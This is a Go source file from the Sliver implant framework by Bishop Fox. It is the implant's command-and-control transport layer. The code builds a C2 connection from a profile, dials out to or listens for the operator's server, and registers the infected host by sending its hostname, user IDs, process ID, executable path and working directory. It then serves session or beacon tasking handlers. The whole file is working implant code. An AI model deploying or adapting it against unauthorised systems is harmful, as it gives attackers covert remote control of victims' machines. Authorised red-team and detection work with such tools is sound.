package c2

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"encoding/json"
	"errors"
	"fmt"
	"net"
	"net/url"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"google.golang.org/protobuf/proto"

	// {{if .Config.CommEnabled}}
	"github.com/bishopfox/sliver/implant/sliver/comm"
	// {{end}}

	consts "github.com/bishopfox/sliver/implant/sliver/constants"
	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/implant/sliver/version"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// C2 - A wrapper around a physical connection, embedding what is necessary to perform
// connection multiplexing, and RPC layer management around these muxed logical streams.
type C2 struct {
	ID     string        // Short ID  for easy selection
	mutex  *sync.RWMutex // Concurrency management
	closed chan struct{} // Notify the transport goroutines we're closed

	// The priority of use of this implant, simply increased at load time by C2s struct
	Priority int

	// Profile - This holds the entirety of the information that pertains to this
	// transport. This profile can be embedded at compile time, or loaded on the fly.
	Profile *sliverpb.Malleable

	// For some C2 libraries and models it's useful to have
	// correctly loaded URL object, like for everything HTTP-based
	uri      *url.URL // used by most protocols
	attempts int      // Number of already tried connections
	failures int      // Number of failed connections

	// conn - A physical connection initiated by/on behalf of this transport.
	// From this conn will be derived one or more streams for different purposes.
	// Sometimes this conn is not a proper physical connection (like yielded by net.Dial)
	// but it nonetheless plays the same role. This conn can be nil if the underlying
	// "physical connection" does not yield a net.Conn.
	Conn net.Conn

	// The RPC layer added around a net.Conn stream, used by implant to talk with the server.
	// It is either setup on top of physical conn, or of a muxed stream.
	// It can be nil if the Transport is tied to a pivoted implant.
	// If the Transport is the ActiveConnection to the C2 server, this cannot
	// be nil, as all underlying transports allow to register a RPC layer.
	Connection *transports.Connection

	// Beacon - The transport can instantiate and use a Beacon client that matches
	// the profile. This beacon is the equivalent of the above C2.Connection field
	Beacon *beacon

	// {{if .Config.CommEnabled}}
	// Comm - Each transport over which a Session Connection (above) is working also
	// has a Comm system object, that is referenced here so that when the transport
	// is cut/switched/close, we can close the Comm subsystem and its connections.
	// This will not be started/used when the C2 type is Beacon.
	Comm *comm.Comm
	// {{end}}
}

// NewMalleableFromBytes - Eventually, we should have all supported transport transports being
// instantiated with this function. It will perform all filtering and setup
// according to the complete URI passed as parameter, and classic templating.
func NewMalleableFromBytes(profileData string) (t *C2, err error) {

	// Base transport settings
	t = &C2{
		mutex:      &sync.RWMutex{},
		closed:     make(chan struct{}),
		failures:   0,
		attempts:   0,
		Profile:    &sliverpb.Malleable{},
		Connection: transports.NewConnection(),
	}
	t.Connection.ErrClosed = Transports.transportErrors

	// Unmarshal from JSON
	err = json.Unmarshal([]byte(profileData), t.Profile)
	if err != nil {
		return nil, errors.New("Failed to parse string profile")
	}

	p := t.Profile
	t.ID = p.ID // The transport has, by default, the same ID as the Profile
	var fullPath = strings.ToLower(p.C2.String()) + "://" + p.Hostname
	if p.Port > 0 {
		fullPath = fullPath + ":" + strconv.Itoa(int(p.Port))
	}
	fullPath = fullPath + p.Path
	t.uri, err = url.Parse(fullPath)
	if err != nil && t.uri == nil {
		return t, errors.New("URL parsing happened, no URL loaded in C2 driver")
	}

	// {{if .Config.Debug}}
	log.Printf("New transport (Type: %s, CC= %s)", p.Direction.String(), t.uri.String())
	// {{end}}

	return
}

// NewMalleableFromProfile - Generate a kinda ready C2 channel driver, from a profile.
func NewMalleableFromProfile(p *sliverpb.Malleable) (t *C2, err error) {

	// Base transport settings
	t = &C2{
		ID:         p.ID,
		mutex:      &sync.RWMutex{},
		closed:     make(chan struct{}),
		failures:   0,
		attempts:   0,
		Profile:    p,
		Connection: transports.NewConnection(),
	}
	t.Connection.ErrClosed = Transports.transportErrors

	path := p.Hostname
	if p.Port > 0 {
		path = path + ":" + strconv.Itoa(int(p.Port))
	}
	if p.Path != "" {
		path = path + p.Path
	}

	t.uri, err = url.Parse(strings.ToLower(p.C2.String()) + "://" + path)
	if err != nil && t.uri == nil {
		return t, errors.New("URL parsing happened, no URL loaded in C2 driver")
	}

	// {{if .Config.Debug}}
	log.Printf("New transport (Type: %s, CC= %s)", p.Direction.String(), t.uri.String())
	// {{end}}

	return
}

// Start the transport as it is currently configured and instantiated.
func (t *C2) Start(isSwitch bool, oldTransportID string) (err error) {
	t.attempts = t.attempts + 1

	// Basic security values that need to be set
	cryptography.TOTPSecret = string(t.Profile.Credentials.TOTPServerSecret)
	cryptography.CACertPEM = string(t.Profile.Credentials.CACertPEM)

	// The starting process happens in this order:
	// 1 - A physical connection is established to
	// the server for protocols based on a net.Conn
	err = t.startTransport()
	if err != nil {
		return
	}

	// In any case, we set up a logical connection:
	// It can make use of either the physical connection if
	// there is one, or create this logical connection directly
	// out of the C2 implementation, like HTTP and DNS C2s
	// This layer is used by BOTH sessions and beacons.
	err = t.StartSession()
	if err != nil {
		return
	}

	t.mutex.RLock()
	t.closed = make(chan struct{}) // The transport is not closed anymore, if it was
	t.Profile.Active = true
	t.mutex.RUnlock()

	// Register this session
	err = t.Register(isSwitch, oldTransportID)
	if err != nil {
		return
	}

	// If the C2 profile is a Session, serve the appropriate handlers
	if t.Profile.Type == sliverpb.C2Type_Session {
		// {{if .Config.Debug}}
		log.Printf("Running in Session mode (Transport ID: %s)", t.ID)
		// {{end}}

		go t.ServeSessionHandlers()
	}

	// If the profile is a beacon, start serving its handlers in the background
	if t.Profile.Type == sliverpb.C2Type_Beacon {
		// {{if .Config.Debug}}
		log.Printf("Running in Beacon mode (Transport ID: %s)", t.ID)
		// {{end}}

		go t.ServeBeacon()
	}

	return
}

// startTransport - For C2 channels that require a low-level primitive transport mechanism,
// like a net.Conn type stream. This function might altogether bypass this step if the C2
// Channel does not require such primitive.
func (t *C2) startTransport() (err error) {
	switch t.Profile.Direction {

	case sliverpb.C2Direction_Bind:
		return t.startBind()

	case sliverpb.C2Direction_Reverse:
		return t.startReverse()
	}
	return
}

// Register - Handle any type of registration message, for any C2 channel/type.
func (t *C2) Register(isSwitch bool, oldTransportID string) (err error) {

	// Register a session
	if t.Profile.Type == sliverpb.C2Type_Session {
		// Either switch
		if isSwitch {
			t.Connection.RequestSend(t.registerSwitch(oldTransportID))
			return
		}
		// Or new
		data, err := proto.Marshal(t.registerSliver())
		if err != nil {
			return fmt.Errorf("Failed to encode register msg %s", err)
		}
		envelope := &sliverpb.Envelope{
			Type: sliverpb.MsgRegister,
			Data: data,
		}
		t.Connection.RequestSend(envelope)
	}

	// Or register a beacon, wrapping the register into a special envelope.
	if t.Profile.Type == sliverpb.C2Type_Beacon {
		if isSwitch {
			t.Connection.RequestSend(t.registerSwitch(oldTransportID))
		} else {
			t.Connection.RequestSend(t.registerBeacon())
		}
		t.Connection.Close()
		time.Sleep(time.Second)
	}

	return
}

// Stop - Gracefully shutdowns all components of this transport. The force parameter is used in case
// we have a mux transport, and that we want to kill it even if there are pending streams in it.
func (t *C2) Stop() (err error) {

	// {{if .Config.Debug}}
	log.Printf("Closing C2 %s (CC: %s) [%s]", t.Profile.ID, t.uri.String(), t.Profile.Type.String())
	// {{end}}

	// If the transport is a beacon, the full connection stack will
	// be automatically closed as soon as its last checkin ends.
	if t.Profile.Type == sliverpb.C2Type_Beacon {
		t.closed <- struct{}{}
		<-t.closed // wait for it to confirm
	}

	// But a session needs to explicitly cut its connection
	if t.Profile.Type == sliverpb.C2Type_Session {
		err = t.Connection.Close()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error closing Session connection: %s", err)
			// {{end}}
		}
	}

	// Just check the physical connection is not nil and kill it if necessary.
	// Normally it should have been cleanup with the Connection type cleanup function.
	if t.Conn != nil {
		// {{if .Config.Debug}}
		log.Printf("killing physical connection (%s  ->  %s", t.Conn.LocalAddr(), t.Conn.RemoteAddr())
		// {{end}}
		t.Conn.Close()
	}

	t.mutex.RLock()
	t.Profile.Active = false
	t.mutex.RUnlock()

	// {{if .Config.Debug}}
	log.Printf("Transport closed (%s)", t.uri.String())
	// {{end}}
	return
}

// registerSliver - Open a new (beacon or normal) session with the server
func (t *C2) registerSliver() *sliverpb.Register {
	hostname, err := os.Hostname()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to determine hostname %s", err)
		// {{end}}
		hostname = ""
	}
	currentUser, err := user.Current()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to determine current user %s", err)
		// {{end}}

		// Gracefully error out
		currentUser = &user.User{
			Username: "<< error >>",
			Uid:      "<< error >>",
			Gid:      "<< error >>",
		}

	}
	filename, err := os.Executable()
	// Should not happen, but still...
	if err != nil {
		//TODO: build the absolute path to os.Args[0]
		if 0 < len(os.Args) {
			filename = os.Args[0]
		} else {
			filename = "<< error >>"
		}
	}

	// {{if .Config.Debug}}
	log.Printf("Session UUID: %s", SessionID)
	// {{end}}

	// Retrieve host UUID
	hostUUID := hostuuid.GetUUID()
	// {{if .Config.Debug}}
	log.Printf("Host UUID: %s", hostUUID)
	// {{end}}

	workDir, _ := os.Getwd()
	// {{if .Config.Debug}}
	log.Printf("Work dir: %s", workDir)
	// {{end}}

	// Transports statistics
	transportsStats := []*sliverpb.Transport{}
	for order, tp := range Transports.Available {
		transport := &sliverpb.Transport{
			ID:       tp.Profile.ID,
			Order:    int32(order),
			Running:  tp.Profile.Active,
			Attempts: int32(tp.attempts),
			Failures: int32(tp.failures),
			// No profile, we have it server-side
		}
		transportsStats = append(transportsStats, transport)
	}

	return &sliverpb.Register{
		// Base
		UUID:             SessionID,
		Name:             consts.SliverName,
		HostUUID:         hostUUID,
		Hostname:         hostname,
		Username:         currentUser.Username,
		Uid:              currentUser.Uid,
		Gid:              currentUser.Gid,
		Os:               runtime.GOOS,
		Version:          version.GetVersion(),
		Arch:             runtime.GOARCH,
		Pid:              int32(os.Getpid()),
		Filename:         filename,
		WorkingDirectory: workDir,

		// Transports
		ActiveTransportID: t.ID,
		TransportStats:    transportsStats,
	}
}

// registerBeacon - Prepare a beacon registration message.
func (t *C2) registerBeacon() *sliverpb.Envelope {
	nextBeacon := time.Now().Add(t.Duration())
	return Envelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
		ID:          BeaconID,
		Interval:    t.Profile.Interval,
		Jitter:      t.Profile.Jitter,
		Register:    t.registerSliver(),
		NextCheckin: nextBeacon.UTC().Unix(),
	})
}

// registerSwitch - The transport is started following a request to switch
// transports. The registering process is not as complete as the classic
// one, and we just update connection/transport relevant values.
func (t *C2) registerSwitch(oldTransportID string) *sliverpb.Envelope {

	register := &sliverpb.RegisterTransportSwitch{
		OldTransportID: oldTransportID,
		TransportID:    t.ID,
		RemoteAddress:  t.uri.String(),
		Response:       &commonpb.Response{},
	}

	if t.Profile.Type == sliverpb.C2Type_Beacon {
		nextBeacon := time.Now().Add(t.Duration())
		register.Beacon = &sliverpb.BeaconRegister{
			ID:          BeaconID,
			Register:    t.registerSliver(),
			Interval:    t.Profile.Interval,
			Jitter:      t.Profile.Jitter,
			NextCheckin: nextBeacon.UTC().Unix(),
		}
	} else {
		register.Session = t.registerSliver()
	}

	data, err := proto.Marshal(register)

	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to encode register msg %s", err)
		// {{end}}
		return nil
	}
	return &sliverpb.Envelope{
		Type: sliverpb.MsgRegisterTransportSwitch,
		Data: data,
	}
}

// FailedAttempt - Notify an failed attempt to initiate
// full Session/Beacon at some point in the stack.
func (t *C2) FailedAttempt() {
	t.mutex.RLock()
	defer t.mutex.RUnlock()
	if t.failures > 0 {
		t.attempts = t.attempts + 1
	}
	t.failures = t.failures + 1
}
